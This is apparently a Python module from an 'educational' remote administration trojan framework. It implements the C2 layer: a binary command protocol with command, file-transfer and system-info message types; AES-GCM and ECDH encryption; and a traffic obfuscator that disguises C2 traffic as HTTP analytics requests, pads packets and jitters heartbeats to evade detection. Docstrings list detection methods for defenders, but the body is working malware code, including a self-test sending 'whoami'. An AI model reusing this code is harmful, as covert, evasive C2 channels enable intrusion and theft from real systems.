"""
============================================================================
 教育用途远程管理框架 - 加密通信模块
 Educational Remote Administration Framework - Crypto Utilities
============================================================================

 学习目标：
 1. 理解对称加密在 C2 通信中的应用
 2. 了解 AES-GCM 认证加密的工作原理
 3. 学习如何使用非对称加密实现密钥交换（ECDH）
 4. 理解重放攻击防御（时间戳 + 序列号）
 5. 了解流量伪装技术

 防守方知识点：
 - JA3/JARM 指纹检测 TLS 客户端
 - 网络流量熵值分析
 - DNS 隧道 / HTTPS 隧道检测
 - 证书透明度日志监控
"""

import os
import time
import json
import hmac
import struct
import hashlib
import logging
from typing import Optional, Tuple

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.ec import (
    ECDH, EllipticCurvePublicKey, EllipticCurvePrivateKey
)
from cryptography.hazmat.primitives.serialization import (
    Encoding, PublicFormat, PrivateFormat, NoEncryption
)

from config import config

logger = logging.getLogger(__name__)


# ============================================================================
# 消息结构定义 / Message Protocol Definition
# ============================================================================

class MessageType:
    """C2 协议消息类型"""
    # 控制消息
    HEARTBEAT    = 0x01   # 心跳包
    REGISTER     = 0x02   # 客户端注册
    ACK          = 0x03   # 确认

    # 命令与响应
    COMMAND      = 0x10   # 下发命令
    RESPONSE     = 0x11   # 命令执行结果

    # 文件操作
    FILE_UPLOAD   = 0x20   # 上传文件到客户端
    FILE_DOWNLOAD = 0x21   # 从客户端下载文件
    FILE_CHUNK    = 0x22   # 文件数据块
    FILE_EOF      = 0x23   # 文件传输结束

    # 系统信息
    SYSTEM_INFO  = 0x30   # 系统信息上报


# ============================================================================
# 消息序列化 / Message Serialization
# ============================================================================

class MessagePacket:
    """
    二进制消息协议

    数据包格式（大端字节序）:
    ┌──────────────┬──────────────┬──────────────┬──────────────┬──────────────┐
    │  Magic (4B)  │  Version (1B)│   Type (1B)  │  Seq  (4B)   │ Timestamp(8B)│
    │  0xEDC0DE    │    0x01      │   see above  │  单调递增    │  Unix微秒    │
    ├──────────────┼──────────────┼──────────────┼──────────────┼──────────────┤
    │  Payload Len │                            Payload                        │
    │    (4B)      │                         (variable)                        │
    └──────────────┴──────────────────────────────────────────────────────────┘

    教育要点：
    - Magic 字节可用于网络协议识别（Snort/Suricata 规则检测）
    - 序列号用于防止重放攻击
    - 时间戳用于检测延迟 / 时钟偏移
    """

    MAGIC = 0xEDC0DE
    VERSION = 0x01
    HEADER_SIZE = 18  # 4 + 1 + 1 + 4 + 8 + 0 (payload len is separate)
    HEADER_FMT = "!IBBIQ"  # 不含 payload_len

    __slots__ = ('msg_type', 'sequence', 'timestamp', 'payload')

    def __init__(self, msg_type: int, sequence: int = 0,
                 timestamp: Optional[int] = None, payload: bytes = b""):
        self.msg_type = msg_type
        self.sequence = sequence
        self.timestamp = timestamp or int(time.time() * 1_000_000)
        self.payload = payload

    def serialize(self) -> bytes:
        """将消息序列化为网络字节序"""
        header = struct.pack(
            self.HEADER_FMT,
            self.MAGIC,
            self.VERSION,
            self.msg_type,
            self.sequence,
            self.timestamp
        )
        payload_len = struct.pack("!I", len(self.payload))
        return header + payload_len + self.payload

    @classmethod
    def deserialize(cls, data: bytes) -> Optional['MessagePacket']:
        """从网络字节序反序列化消息"""
        if len(data) < cls.HEADER_SIZE + 4:  # header + payload_len
            return None

        magic, version, msg_type, seq, timestamp = struct.unpack(
            cls.HEADER_FMT, data[:cls.HEADER_SIZE]
        )

        # Magic 校验 —— 类似 IDS 规则的协议检测点
        if magic != cls.MAGIC:
            logger.warning(f"[SECURITY] Invalid magic bytes: 0x{magic:06X}")
            return None

        if version != cls.VERSION:
            logger.warning(f"[SECURITY] Unsupported protocol version: {version}")
            return None

        payload_len = struct.unpack("!I", data[cls.HEADER_SIZE:cls.HEADER_SIZE + 4])[0]

        payload_start = cls.HEADER_SIZE + 4
        payload = data[payload_start:payload_start + payload_len]

        return cls(msg_type=msg_type, sequence=seq, timestamp=timestamp, payload=payload)


# ============================================================================
# AES-GCM 对称加密 / Symmetric Encryption
# ============================================================================

class SymmetricCrypto:
    """
    AES-256-GCM 对称加密器

    教育要点：
    - GCM 模式同时提供机密性和完整性验证（AEAD）
    - Nonce 绝对不能重复使用（否则密钥泄露）
    - 附加数据 (AAD) 可用于绑定上下文（如客户端 ID）
    """

    def __init__(self, key: bytes):
        if len(key) != 32:
            raise ValueError(f"AES-256 requires 32-byte key, got {len(key)}")
        self._aesgcm = AESGCM(key)

    def encrypt(self, plaintext: bytes, associated_data: bytes = b"") -> bytes:
        """
        加密数据

        Returns: nonce (12B) + ciphertext (includes 16B tag)
        """
        nonce = os.urandom(config.crypto.nonce_size)
        ciphertext = self._aesgcm.encrypt(nonce, plaintext, associated_data)
        return nonce + ciphertext

    def decrypt(self, encrypted_data: bytes, associated_data: bytes = b"") -> Optional[bytes]:
        """
        解密数据

        Args:
            encrypted_data: nonce (12B) + ciphertext
        Returns: plaintext or None if auth failed
        """
        try:
            nonce = encrypted_data[:config.crypto.nonce_size]
            ciphertext = encrypted_data[config.crypto.nonce_size:]
            return self._aesgcm.decrypt(nonce, ciphertext, associated_data)
        except Exception as e:
            logger.error(f"[SECURITY] Decryption/Auth failed: {e}")
            return None


# ============================================================================
# ECDH 密钥交换（高级主题）/ Key Exchange
# ============================================================================

class KeyExchange:
    """
    ECDH (Elliptic Curve Diffie-Hellman) 密钥交换

    教育要点：
    这是「教科书级」实现，展示现代恶意软件如何协商会话密钥。
    实际恶意软件常用：
    - X25519 (比 NIST P-256 更快)
    - 混合加密：ECDH + 预共享密钥
    - 每次连接重新协商

    防守方检测：
    - 虽然无法解密内容，但可检测 TLS 握手中的异常椭圆曲线参数
    - 监控非标准端口的 TLS 流量
    """

    CURVE = ec.SECP256R1()

    def __init__(self):
        self._private_key: EllipticCurvePrivateKey = ec.generate_private_key(
            self.CURVE
        )
        self._shared_key: Optional[bytes] = None

    @property
    def public_key_bytes(self) -> bytes:
        """导出公钥（用于交换）"""
        return self._private_key.public_key().public_bytes(
            Encoding.X962, PublicFormat.CompressedPoint
        )

    def compute_shared_key(self, peer_public_bytes: bytes) -> bytes:
        """计算共享密钥"""
        peer_public = ec.EllipticCurvePublicKey.from_encoded_point(
            self.CURVE, peer_public_bytes
        )
        shared_secret = self._private_key.exchange(ECDH(), peer_public)

        # 使用 HKDF 从共享秘密派生最终密钥
        derived = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b"edu-rat-key-derivation",
        ).derive(shared_secret)

        self._shared_key = derived
        return derived


# ============================================================================
# 消息完整性校验 / Integrity Check
# ============================================================================

def compute_hmac(key: bytes, data: bytes) -> bytes:
    """计算 HMAC-SHA256 用于完整性校验"""
    return hmac.new(key, data, hashlib.sha256).digest()


def verify_hmac(key: bytes, data: bytes, expected: bytes) -> bool:
    """验证 HMAC（使用常量时间比较防时序攻击）"""
    return hmac.compare_digest(
        compute_hmac(key, data), expected
    )


# ============================================================================
# 加密传输层 / Encrypted Transport Layer
# ============================================================================

class SecureChannel:
    """
    安全通信通道

    封装：序列化 → 加密 → 发送 / 接收 → 解密 → 反序列化

    教育要点：
    - 这是典型的「加密隧道」模式
    - 防守方可检测：流量熵值高（加密特征）、非标准协议
    - 更隐蔽的做法是伪装成 HTTPS/DNS/ICMP 流量（协议隧道）
    """

    def __init__(self, crypto: SymmetricCrypto):
        self._crypto = crypto
        self._send_seq: int = 0
        self._recv_seq: int = 0

    def pack_message(self, msg_type: int, payload: bytes = b"") -> bytes:
        """
        打包并加密消息

        步骤: JSON/二进制 → MessagePacket → 序列化 → AES-GCM 加密
        """
        self._send_seq += 1
        packet = MessagePacket(
            msg_type=msg_type,
            sequence=self._send_seq,
            payload=payload
        )

        # 关联数据绑定：序列号防止重放
        # 注意: 不包含 msg_type 是因为解密后才知道 type；
        # 序列号足以防止重放，msg_type 校验在反序列化后进行
        associated_data = struct.pack("!I", self._send_seq)

        raw = packet.serialize()
        encrypted = self._crypto.encrypt(raw, associated_data)
        return encrypted

    def unpack_message(self, data: bytes) -> Optional[MessagePacket]:
        """
        解密并解析消息

        Returns: MessagePacket or None if decryption/auth fails
        """
        # 关联数据：使用预期序列号（严格递增）进行验证
        expected_seq = self._recv_seq + 1
        associated_data = struct.pack("!I", expected_seq)

        # 解密（关联数据不匹配则认证失败）
        raw = self._crypto.decrypt(data, associated_data)
        if raw is None:
            return None

        packet = MessagePacket.deserialize(raw)
        if packet is None:
            return None

        # 序列号验证（防重放 —— 双重检查）
        if packet.sequence != expected_seq:
            logger.warning(
                f"[SECURITY] Sequence mismatch: got={packet.sequence} "
                f"expected={expected_seq}"
            )
            # 允许轻微偏差（UDP 乱序场景），但拒绝小于等于已接收的
            if packet.sequence <= self._recv_seq:
                logger.warning(f"[SECURITY] Possible replay attack detected")
                return None

        self._recv_seq = max(self._recv_seq, packet.sequence)

        # 时间戳验证（防过期消息，5分钟窗口）
        age = time.time() - (packet.timestamp / 1_000_000)
        if abs(age) > 300:  # 5 分钟
            logger.warning(
                f"[SECURITY] Stale message detected: age={age:.1f}s"
            )
            # 教育模式：警告但不拒绝（时钟可能不同步）

        return packet


# ============================================================================
# 流量混淆器 / Traffic Obfuscator (教育用途)
# ============================================================================

class TrafficObfuscator:
    """
    流量混淆 —— 让 C2 流量看起来像正常流量

    教育用途：理解恶意软件如何逃避基于签名的检测

    常见技术：
    1. 伪装成 HTTP/HTTPS (域前置)
    2. 伪装成 DNS 查询 (DNS 隧道)
    3. Base64 编码 + 压缩
    4. 流量填充（防止基于包大小的检测）
    5. 随机抖动（防止基于时间的检测）

    防守方检测方法：
    - JA3/JARM TLS 指纹
    - 网络流量行为分析（连接频率、数据量异常）
    - DNS 查询熵值分析
    - HTTPS 证书透明度日志监控
    """

    # HTTP 伪装模板（看起来像正常的 API 请求）
    HTTP_TEMPLATE = (
        b"POST /api/v2/analytics HTTP/1.1\r\n"
        b"Host: cdn-analytics.example.com\r\n"
        b"Content-Type: application/octet-stream\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        b"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
        b"Content-Length: {length}\r\n"
        b"\r\n"
    )

    @staticmethod
    def http_disguise(data: bytes) -> bytes:
        """将数据包装成 HTTP POST 请求"""
        header = TrafficObfuscator.HTTP_TEMPLATE.replace(
            b"{length}", str(len(data)).encode()
        )
        return header + data

    @staticmethod
    def pad_traffic(data: bytes, min_size: int = 512) -> bytes:
        """
        流量填充 —— 所有包填充到相同大小
        防止基于包大小的流量分析
        """
        if len(data) >= min_size:
            return data
        padding = os.urandom(min_size - len(data))
        return data + b"\x00" * 1 + padding  # 1 字节分隔

    @staticmethod
    def add_jitter(base_delay: float, jitter_ratio: float = 0.3) -> float:
        """
        添加随机抖动 —— 让心跳间隔不规则
        防守方检测：统计方法可发现周期性行为的异常
        """
        import random
        jitter = base_delay * jitter_ratio * (random.random() * 2 - 1)
        return max(0.1, base_delay + jitter)


# ============================================================================
# 自测 / Self-Test
# ============================================================================

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    logger.setLevel(logging.DEBUG)

    print("=" * 60)
    print("加密模块自测 / Crypto Module Self-Test")
    print("=" * 60)

    # 1. AES-GCM 加密/解密测试
    print("\n[1] AES-256-GCM 加解密测试")
    key = config.crypto.derived_key
    crypto = SymmetricCrypto(key)

    plaintext = b"Hello from educational RAT! This is a test message."
    encrypted = crypto.encrypt(plaintext)
    print(f"    明文: {plaintext}")
    print(f"    密文长度: {len(encrypted)} bytes (nonce 12B + data + tag 16B)")

    decrypted = crypto.decrypt(encrypted)
    assert decrypted == plaintext, "解密失败！"
    print("    ✓ 加解密成功")

    # 2. 消息序列化测试
    print("\n[2] 消息协议序列化测试")
    original = MessagePacket(
        msg_type=MessageType.HEARTBEAT,
        sequence=1,
        payload=b'{"status":"alive"}'
    )
    serialized = original.serialize()
    print(f"    序列化大小: {len(serialized)} bytes")

    deserialized = MessagePacket.deserialize(serialized)
    assert deserialized is not None
    assert deserialized.msg_type == original.msg_type
    assert deserialized.sequence == original.sequence
    assert deserialized.payload == original.payload
    print("    ✓ 序列化/反序列化成功")

    # 3. 安全通道测试
    print("\n[3] 安全通道端到端测试")
    channel = SecureChannel(crypto)

    # 加密发送
    encrypted_msg = channel.pack_message(MessageType.COMMAND, b"whoami")
    print(f"    加密消息大小: {len(encrypted_msg)} bytes")

    # 解密接收（模拟接收端需要新建 channel 或重置序列号）
    recv_channel = SecureChannel(crypto)
    packet = recv_channel.unpack_message(encrypted_msg)
    assert packet is not None
    assert packet.msg_type == MessageType.COMMAND
    assert packet.payload == b"whoami"
    print("    ✓ 安全通道通信成功")

    # 4. HMAC 完整性测试
    print("\n[4] HMAC 完整性校验测试")
    mac = compute_hmac(key, plaintext)
    assert verify_hmac(key, plaintext, mac)
    assert not verify_hmac(key, plaintext, b"wrong_mac_12345678901234567890")
    print("    ✓ HMAC 校验成功")

    # 5. ECDH 密钥交换测试
    print("\n[5] ECDH 密钥交换测试")
    alice = KeyExchange()
    bob = KeyExchange()

    alice_shared = alice.compute_shared_key(bob.public_key_bytes)
    bob_shared = bob.compute_shared_key(alice.public_key_bytes)

    assert alice_shared == bob_shared, "密钥交换失败！"
    print(f"    共享密钥: {alice_shared[:8].hex()}... (256-bit)")
    print("    ✓ ECDH 密钥交换成功")

    # 6. 流量混淆测试
    print("\n[6] 流量混淆测试")
    original_data = b"some c2 data payload"
    disguised = TrafficObfuscator.http_disguise(original_data)
    print(f"    原始数据: {len(original_data)} bytes")
    print(f"    伪装后: {len(disguised)} bytes")
    print(f"    伪装成: HTTP POST /api/v2/analytics")
    print("    ✓ 流量伪装成功")

    print("\n" + "=" * 60)
    print("所有测试通过！ / All tests passed!")
    print("=" * 60)
